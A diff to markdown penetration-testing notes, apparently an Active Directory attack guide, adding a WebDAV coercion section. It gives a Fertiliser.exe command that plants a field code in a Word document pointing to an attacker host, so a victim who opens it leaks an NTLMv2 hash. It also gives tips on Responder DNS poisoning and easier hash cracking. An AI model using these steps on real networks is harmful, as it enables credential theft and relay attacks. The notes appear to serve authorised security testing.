@@ -124,9 +124,16 @@ To identify the ESC11 vulnerability, the following fork of the certipy tool has 
 ## WebDAV
 WebDAV is a file server over HTTP. The service WebClient is present on workstations by default (Not on server OS). This produces an HTTP hash which can be relayed to LDAP.
 
-**Prerequisites**   
+### Prerequisites
 - Requires the system’s NetBIOS name
 - Must be in the "local intranet" zone 
 - Requires DNS record
   - Either poisoned in the local subnet using Responder
   - Create a DNS A record pointing to an external IP (Check ADIDNS --> https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing or https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
+
+### Exploitation
+**Example Using Fertiliser.exe:**   
+Using the tool Fertiliser.exe (GitHub.com/mdsecactivebreach/Farmer) a docx file was updated to contain a malicious field code pointing to the WebDAV server running on Kali (Responder.py instance):   
+`.\Fertiliser.exe C:\_Tools\Farmer\Testdoc.docx http://kali/foo "Update required"`   
+Once the Word document is opened on the victim client, the connection was initiated and the NTLMv2 hash (Net-NTLMv2) is captured.   
+Note: For WebDAV to work, do not use the FQDN, instead the NetBIOS name! Also, for easier cracking of the hash, set the static challenge in Responder.conf to "1122334455667788"!
